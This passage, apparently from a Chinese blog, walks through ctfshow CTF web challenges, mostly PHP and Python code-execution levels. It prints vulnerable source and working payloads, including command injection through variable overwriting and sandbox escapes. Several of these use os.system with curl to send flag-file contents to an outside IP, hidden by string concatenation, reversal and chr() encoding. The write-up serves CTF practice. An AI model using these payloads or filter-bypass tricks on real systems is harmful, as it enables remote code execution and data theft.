jF4MllXTHFoVEozeDNncVNpdjJ2eXZLdHVlSzltaTFTcExxOTNOZzBIYWl1N05JND0iO2V2YWwoJz8+Jy4kQ0JoU2Z3KCR4V29JVnkoJFJrRUV1VigkalhqdEtkLCRZRmZLclcqMiksJFJrRUV1VigkalhqdEtkLCRZRmZLclcsJFlGZktyVyksJFJrRUV1VigkalhqdEtkLDAsJFlGZktyVykpKSk7&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>不过看起来上了混淆（刚开始还以为是个webshell。。），得去一下混淆</p>
<p>nnd，有套娃。。。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strtr</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$NpmjHq</span>, <span class="number">52</span> * <span class="number">2</span>), <span class="title function_ invoke__">substr</span>(<span class="variable">$NpmjHq</span>, <span class="number">52</span>, <span class="number">52</span>), <span class="title function_ invoke__">substr</span>(<span class="variable">$NpmjHq</span>, <span class="number">0</span>, <span class="number">52</span>)));</span><br></pre></td></tr></table></figure>

<p>最终得到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 20:52:23</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$c</span>==<span class="string">&#x27;show&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf=show</span><br></pre></td></tr></table></figure></li>
<li><p>web418 帮大黑阔写好后门</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 23:52:58</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$key</span>= <span class="number">0</span>;</span><br><span class="line"><span class="variable">$clear</span>=<span class="string">&#x27;clear.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取参数</span></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"><span class="comment">//包含清理脚本</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$clear</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key</span>===<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="comment">//帮黑阔写好后门</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;&lt;?php &#x27;</span>.<span class="variable">$ctfshow</span>.<span class="string">&#x27;?&gt;&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$die</span>?<span class="keyword">die</span>(<span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>):<span class="title function_ invoke__">clear</span>(<span class="variable">$clear</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先由于这里是一个强类型比较，即使我们可以利用extract进行变量覆盖，也无法利用ctfshow这个变量进行RCE。所以下面就要考虑<code>clear()</code>函数，它看起来像是clear.php中的函数。其实 这里也没说明这个函数参数是咋用的，但是应该是有一个<code>shell_exec</code>作为sink。那么我们就可以利用管道符拼接那一套</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clear=;cp flag.php flag.txt </span><br></pre></td></tr></table></figure>

<p>但是注意我们要成功传入clear函数还需满足die变量值为0且key随便取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key=a&amp;die=0&amp;clear=;cp flag.php flag.txt</span><br></pre></td></tr></table></figure></li>
<li><p>web419 想想办法</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-29 01:36:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">17</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: code in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">18</span></span><br></pre></td></tr></table></figure>

<p>这里可以执行任意代码，限制了长度不能超过16</p>
<p>还是很充足的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=echo `cat fl*`;</span><br></pre></td></tr></table></figure></li>
<li><p>web420 想想办法</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-29 01:41:05</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: code in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">18</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="title function_ invoke__">system</span>(): Cannot execute a blank command in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>直接换成system了，不用我们自己回显</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env</span><br></pre></td></tr></table></figure>

<p>不过发现flag不在根目录也不在当前目录了，不过发现在上一级，但是我们code最多7个字符，可以利用<code>nl</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl ../*</span><br></pre></td></tr></table></figure></li>
<li><p>web421 想想办法</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-29 01:42:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">6</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: code in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">18</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="title function_ invoke__">system</span>(): Cannot execute a blank command in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>这次虽然限制到了5个字符，但是flag在当前目录了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl f*</span><br></pre></td></tr></table></figure></li>
<li><p>web422 想想办法</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-29 01:42:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">5</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: code in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">18</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="title function_ invoke__">system</span>(): Cannot execute a blank command in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>秀啊，限制到4个字符了。不过nl是支持读多个文件的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl *</span><br></pre></td></tr></table></figure></li>
<li><p>web423 想想办法</p>
<p>源代码中提示<code>/?code</code></p>
<p>这题出的有点提示太少了，wp中有源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    	<span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>题目导入了os模块，因此我们可以直接使用一些系统执行函数，比如<code>os.popen()</code>或者<code>os.system()</code>不过也可以直接调用读写文件函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure></li>
<li><p>web424 想想办法</p>
<p>（去掉了os模块）没变化</p>
</li>
<li><p>web425 想想办法</p>
<p>这道题实际上是过滤了<code>os|popen</code>，仍然没过滤open</p>
</li>
<li><p>web426 想想办法</p>
<p>过滤<code>os|popen</code></p>
</li>
<li><p>web427 想想办法</p>
<p>过滤<code>os|popen|system</code></p>
</li>
<li><p>web428 想想办法</p>
<p>过滤<code> os|popen|system|read</code>，题出的有问题</p>
</li>
<li><p>web429 想想办法</p>
<p>匹配正则时没有去掉前后的空格，因此还是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;space&gt;open(%27/flag%27).read()</span><br></pre></td></tr></table></figure></li>
<li><p>web430 想想办法</p>
<p>过滤<code>os|open|system|read|eval</code></p>
</li>
<li><p>web431 想想办法</p>
<p>过滤<code>os|open|system|read|eval|str</code></p>
</li>
<li><p>web432 想想办法</p>
<p>这关恢复正常了，过滤掉了<code>os|open|system|read|eval</code></p>
<p>这里可以利用模板注入的思路</p>
<p>首先获取当前命名空间下所有内置函数的字典，可以通过<code>str()</code>来输出以便服务器回显</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221121230637067.png" alt="image-20221121230637067"></p>
</li>
</ol>
<p>可以看到我们是可以调用import模块的，我们导入os模块即</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[&#x27;__impor&#x27;%2b&#x27;t__&#x27;](&#x27;o&#x27;%2b&#x27;s&#x27;)</span><br></pre></td></tr></table></figure>

<p>接着利用其命令执行函数<code>system</code>，绕过思路就是可以改成用魔术方法<code>__getattribute__</code>来使得方法用字符串的方式来调用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[&#x27;__impor&#x27;%2b&#x27;t__&#x27;](&#x27;o&#x27;%2b&#x27;s&#x27;).__getattribute__(&#x27;sys&#x27;%2b&#x27;tem&#x27;)</span><br></pre></td></tr></table></figure>

<p>我们利用一个curl来外带数据即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str(__builtins__.__dict__[&#x27;__impor&#x27;%2b&#x27;t__&#x27;](&#x27;o&#x27;%2b&#x27;s&#x27;).__getattribute__(&#x27;sys&#x27;%2b&#x27;tem&#x27;)(&#x27;curl http://43.140.198.45:5000/?flag=`cat /f*`&#x27;))</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221121231457518.png" alt="image-20221121231457518"></p>
<ol start="38">
<li><p>web433 想想办法</p>
<p>过滤<code>os|open|system|read|eval|builtins</code></p>
<p>直接调用<code>__import__</code> 也是可以滴</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str(__import__(&#x27;o&#x27;%2b&#x27;s&#x27;).__getattribute__(&#x27;sys&#x27;%2b&#x27;tem&#x27;)(&#x27;curl http://43.140.198.45:5000/?flag=`cat /f*`&#x27;))</span><br></pre></td></tr></table></figure></li>
<li><p>web434 想想办法</p>
<p>这次过滤了<code>os|open|system|read|eval|builtins|curl</code></p>
<p>当然只要是字符串我们就可以通过拼接绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str(__import__(&#x27;o&#x27;%2b&#x27;s&#x27;).__getattribute__(&#x27;sys&#x27;%2b&#x27;tem&#x27;)(&#x27;cur&#x27;%2b&#x27;l http://43.140.198.45:5000/?flag=`cat /f*`&#x27;))</span><br></pre></td></tr></table></figure></li>
<li><p>web435-439 想想办法</p>
<p>这次过滤<code>os|open|system|read|eval|builtins|curl|_</code></p>
<p>这里学习一个新的命令执行函数<code>exec</code>（咋跟java那么像）</p>
<p><img src="/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221121232526938.png" alt="image-20221121232526938"></p>
</li>
</ol>
<p>这样就可以提供一个类似eval的函数，并且我们是可以执行多条python代码的（通过分号进行分割）</p>
<p>而针对关键词的过滤这关我们换个方法，利用字符串反转</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str(exec(&#x27;)&quot;`*f/ tac`=galf?/0005:54.891.041.34//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1]))</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221121232907990.png" alt="image-20221121232907990"></p>
<ol start="41">
<li><p>web440 想想办法</p>
<p>这关多过滤了引号，我们有内置函数<code>chr()</code>可以用，通过chr进行拼接</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cchr</span>(<span class="params">s</span>):</span><br><span class="line">    exp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(s)-<span class="number">1</span>:</span><br><span class="line">            exp += <span class="string">&#x27;chr(&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">ord</span>(s[i]))+<span class="string">&#x27;)%2b&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exp += <span class="string">&#x27;chr(&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">ord</span>(s[i])) + <span class="string">&#x27;)&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> exp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;import os; os.system(&quot;curl http://43.140.198.45:5000/?flag=`cat /f*`&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(cchr(payload))</span><br></pre></td></tr></table></figure>

<p><strong>payload：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str(exec(chr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(32)%2bchr(111)%2bchr(115)%2bchr(59)%2bchr(32)%2bchr(111)%2bchr(115)%2bchr(46)%2bchr(115)%2bchr(121)%2bchr(115)%2bchr(116)%2bchr(101)%2bchr(109)%2bchr(40)%2bchr(34)%2bchr(99)%2bchr(117)%2bchr(114)%2bchr(108)%2bchr(32)%2bchr(104)%2bchr(116)%2bchr(116)%2bchr(112)%2bchr(58)%2bchr(47)%2bchr(47)%2bchr(52)%2bchr(51)%2bchr(46)%2bchr(49)%2bchr(52)%2bchr(48)%2bchr(46)%2bchr(49)%2bchr(57)%2bchr(56)%2bchr(46)%2bchr(52)%2bchr(53)%2bchr(58)%2bchr(53)%2bchr(48)%2bchr(48)%2bchr(48)%2bchr(47)%2bchr(63)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(61)%2bchr(96)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(42)%2bchr(96)%2bchr(34)%2bchr(41)))</span><br></pre></td></tr></table></figure></li>
<li><p>web441 想想办法</p>
<p>多过滤双引号，这里再复习一下ssti绕过思路中的request绕过，由于是代码执行，所以是可以直接调用<code>request.args.get</code>的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str(exec(request.args.get(chr(97))))&amp;a=__import__(&#x27;os&#x27;).system(&#x27;curl http://43.140.198.45:5000/?flag=`cat /f*`&#x27;)</span><br></pre></td></tr></table></figure></li>
<li><p>web442 想想办法</p>
<p>这关针对code变量过滤掉了数字，也就是<strong>chr</strong>没法直接用了。我们利用其的目的其实只是为了获取一个字符串用来充当传参变量名，所以找另外一个可以直接返回字符串的函数也是可以的，比如<code>request.method</code>就会返回<code>GET</code>字符串，而我们拿它当变量名就好了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str(exec(request.args.get(request.method)))&amp;GET=__import__(&#x27;os&#x27;).system(&#x27;curl http://43.140.198.45:5000/?flag=`cat /f*`&#x27;)</span><br></pre></td></tr></table></figure></li>
<li><p>web443 想想办法，<strong>提交参数为POST</strong></p>
<p>这里的思路是构造数字，参考自偶像Y4tacker</p>
<p>这里用的是一种递归式构造，对于最基本的数字，即-2,-1,0,1，我们即采用长度构造的方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0 -&gt; int(len(str()))</span><br><span class="line">1-&gt; int(len(str(None))/len(str(None)))	</span><br><span class="line">0 的取反是 -1</span><br><span class="line">1 的取反是 -2</span><br><span class="line">-1 -&gt; ~int(len(str()))</span><br><span class="line">-2 -&gt; ~int(len(str(None))/len(str(None)))	</span><br></pre></td></tr></table></figure>

<p>而对于其他数字我们拆分成奇数和偶数，对于所有的奇数，都是可以通过取反一个小的数字来构造出的；而对于偶数，采用移位的方式<code>&lt;&lt;</code>，没除一次2，就移位1次</p>
